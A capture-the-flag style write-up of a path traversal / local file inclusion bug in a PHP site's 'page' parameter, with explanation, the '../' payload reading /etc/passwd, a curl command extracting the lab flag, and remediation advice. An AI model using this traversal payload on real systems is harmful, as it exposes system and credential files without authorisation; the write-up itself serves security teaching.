# Path Traversal / Local File Inclusion (LFI)

## Breach Type
**Path Traversal / Local File Inclusion** — OWASP Top 10: A01:2021 Broken Access Control

## What is this Vulnerability?
**Path Traversal** (also known as Directory Traversal or dot-dot-slash attack) is a vulnerability that allows an attacker to access files and directories that are stored **outside the intended directory**. The attacker uses `../` sequences to "climb up" the directory tree and reach sensitive system files.

In simple terms: when a website loads pages using a URL parameter like `?page=about`, the server does something like `include("/var/www/pages/" + page)`. If the server doesn't validate the input, an attacker can type `?page=../../../etc/passwd` and the server will include `/var/www/pages/../../../etc/passwd` = `/etc/passwd` — a file containing all system usernames.

### Why is it dangerous?
- **Sensitive file access**: Read `/etc/passwd`, `/etc/shadow`, configuration files with database credentials
- **Source code exposure**: Read the application's own PHP/Python source code, revealing more vulnerabilities
- **Credential theft**: Access configuration files containing database passwords, API keys, secret tokens
- **Remote Code Execution**: If combined with **Local File Inclusion (LFI)**, the attacker can include malicious files (like log files containing injected PHP code) and execute arbitrary commands
- **Full server compromise**: With enough file access, an attacker can escalate to full system control

### Real-world impact
Path traversal vulnerabilities have been found in major products including Apache HTTP Server (CVE-2021-41773), Fortinet VPN, and Citrix ADC. These often lead to mass exploitation because they're easy to automate.

## Where
URL: `http://<IP>/index.php?page=../../../../../../../etc/passwd`
The `page` parameter in the main URL.

## How I Found It
1. Noticed that all pages are loaded via `index.php?page=<pagename>` (e.g., `?page=survey`, `?page=member`).
2. This suggests the server uses the `page` parameter to include/load files from the filesystem.
3. Tested with `../../../../../../../etc/passwd` to traverse directories upward to the root and access `/etc/passwd`.
4. The server responded with a JavaScript alert containing a flag, confirming the vulnerability.

## Step-by-Step Exploitation

### Step 1: Identify the Parameter
The website uses `page` parameter to load content:
```
http://<IP>/index.php?page=survey
http://<IP>/index.php?page=member
http://<IP>/index.php?page=signin
```

### Step 2: Test Path Traversal
```
http://<IP>/index.php?page=../../../../../../../etc/passwd
```

### Step 3: Get the Flag
The server responds with:
```html
<script>alert('Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 ');</script>
```

Using curl:
```bash
curl -s "http://<IP>/index.php?page=../../../../../../../etc/passwd" | grep -oP "flag is : [a-f0-9]+"
```

## Flag
```
b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0
```

## How to Test Manually
1. Open your browser
2. Go to: `http://<IP>/index.php?page=../../../../../../../etc/passwd`
3. You will see a JavaScript alert with the flag

## How to Fix
- **Whitelist** allowed page values instead of using user input directly in file paths
- Never pass user input directly to `include()`, `require()`, or `file_get_contents()`
- Use a **mapping** (e.g., `$pages = ['survey' => 'survey.php', 'member' => 'member.php']`)
- Apply `basename()` or `realpath()` to strip directory traversal sequences
- Configure **open_basedir** in PHP to restrict accessible directories

## OWASP Reference
- [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [LFI Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
